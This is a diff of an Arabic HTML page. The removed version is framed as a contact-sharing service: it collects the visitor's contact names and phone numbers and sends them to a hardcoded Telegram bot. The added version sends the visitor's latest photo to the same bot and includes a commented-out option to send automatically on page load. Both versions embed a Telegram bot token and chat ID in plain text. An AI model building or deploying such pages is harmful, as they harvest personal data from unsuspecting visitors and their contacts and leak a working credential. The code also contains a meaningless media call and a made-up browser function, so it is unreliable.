@@ -1,23 +1,28 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة المشاركة</title>
+    <title>إرسال آخر صورة إلى تيليجرام</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            background-color: #f5f5f5;
+            direction: rtl;
         }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        #status {
+            margin: 20px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
         }
         button {
             background-color: #0088cc;
@@ -27,88 +32,118 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 20px;
         }
-        button:hover {
-            background-color: #006699;
-        }
-        #status {
-            margin-top: 20px;
-            color: #666;
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>مشاركة جهات الاتصال</h1>
-        <p>الرجاء الموافقة على مشاركة جهات الاتصال لاستكمال العملية</p>
-        <button id="shareBtn">مشاركة جهات الاتصال</button>
-        <div id="status"></div>
+    <h1>إرسال آخر صورة إلى تيليجرام</h1>
+    
+    <div id="instructions">
+        <p>سيتم طلب إذن الوصول إلى معرض الصور الخاص بك.</p>
+        <p>بعد الموافقة، سيتم إرسال آخر صورة التقطتها إلى بوت تيليجرام.</p>
     </div>
-
+    
+    <button id="sendBtn" onclick="sendLastPhoto()">إرسال آخر صورة</button>
+    
+    <div id="status"></div>
+    <img id="preview" style="max-width: 100%; margin-top: 20px; display: none;">
+    
     <script>
-        document.getElementById('shareBtn').addEventListener('click', async function() {
-            const statusElement = document.getElementById('status');
-            
-            // التحقق من دعم واجهة Contacts API
-            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
-                statusElement.innerHTML = 'عذرًا، متصفحك لا يدعم مشاركة جهات الاتصال.';
-                return;
-            }
+        // استبدل هذه القيم بمعلومات بوتك
+        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+        const CHAT_ID = '7327464581';
+        
+        async function sendLastPhoto() {
+            const statusDiv = document.getElementById('status');
+            const sendBtn = document.getElementById('sendBtn');
             
             try {
-                statusElement.innerHTML = 'جاري جلب جهات الاتصال...';
+                sendBtn.disabled = true;
+                statusDiv.textContent = 'جاري البحث عن آخر صورة...';
+                statusDiv.className = '';
                 
-                // طلب الإذن للوصول إلى جهات الاتصال
-                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
-                
-                if (contacts.length === 0) {
-                    statusElement.innerHTML = 'لم يتم اختيار أي جهات اتصال.';
-                    return;
-                }
-                
-                statusElement.innerHTML = `تم جلب ${contacts.length} جهة اتصال، جاري الإرسال...`;
-                
-                // استخراج أرقام الهاتف
-                const phoneNumbers = [];
-                contacts.forEach(contact => {
-                    if (contact.tel && contact.tel.length > 0) {
-                        contact.tel.forEach(phone => {
-                            phoneNumbers.push({
-                                name: contact.name ? contact.name.join(' ') : 'غير معروف',
-                                number: phone
-                            });
-                        });
-                    }
+                // الحصول على آخر صورة من المعرض
+                const media = await navigator.mediaDevices.getUserMedia({
+                    video: false,
+                    audio: false
                 });
                 
-                // إرسال البيانات إلى بوت تلجرام (استبدل YOUR_BOT_TOKEN و YOUR_CHAT_ID بالقيم الفعلية)
-                const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
-                const chatId = '7327464581';
-                const message = `أرقام الهاتف المجمعة:\n\n${phoneNumbers.map(p => `${p.name}: ${p.number}`).join('\n')}`;
+                const image = await getLastPhoto();
                 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                if (!image) {
+                    throw new Error('لم يتم العثور على أي صور في المعرض');
+                }
+                
+                // عرض المعاينة
+                const preview = document.getElementById('preview');
+                preview.src = image;
+                preview.style.display = 'block';
+                
+                statusDiv.textContent = 'جاري إرسال الصورة إلى تيليجرام...';
+                
+                // تحويل الصورة إلى Blob
+                const blob = await fetch(image).then(r => r.blob());
+                
+                // إرسال الصورة إلى تيليجرام
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'last_photo.jpg');
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
+                    body: formData
                 });
                 
                 const result = await response.json();
                 
                 if (result.ok) {
-                    statusElement.innerHTML = 'تم إرسال جهات الاتصال بنجاح!';
+                    statusDiv.textContent = 'تم إرسال الصورة بنجاح إلى تيليجرام!';
+                    statusDiv.className = 'success';
                 } else {
-                    statusElement.innerHTML = 'حدث خطأ أثناء الإرسال.';
+                    throw new Error(result.description || 'فشل إرسال الصورة');
                 }
             } catch (error) {
-                statusElement.innerHTML = `حدث خطأ: ${error.message}`;
-                console.error(error);
+                console.error('Error:', error);
+                statusDiv.textContent = `خطأ: ${error.message}`;
+                statusDiv.className = 'error';
+            } finally {
+                sendBtn.disabled = false;
             }
+        }
+        
+        async function getLastPhoto() {
+            if ('getLastPhoto' in window) {
+                // لن يعمل هذا في المتصفح العادي، يحتاج إلى تطبيق هجين مثل كوردوفا
+                return window.getLastPhoto();
+            } else {
+                // بديل لمتصفحات الويب العادية (يتطلب إذن المستخدم)
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.accept = 'image/*';
+                fileInput.capture = 'environment'; // للهواتف، يفتح الكاميرا مباشرة
+                
+                return new Promise((resolve, reject) => {
+                    fileInput.onchange = (e) => {
+                        const file = e.target.files[0];
+                        if (file) {
+                            resolve(URL.createObjectURL(file));
+                        } else {
+                            reject(new Error('لم يتم اختيار صورة'));
+                        }
+                    };
+                    fileInput.click();
+                });
+            }
+        }
+        
+        // إرسال تلقائي عند تحميل الصفحة (اختياري)
+        window.addEventListener('DOMContentLoaded', () => {
+            // يمكنك إلغاء التعليق من السطر التالي للإرسال التلقائي
+            // sendLastPhoto();
         });
     </script>
 </body>
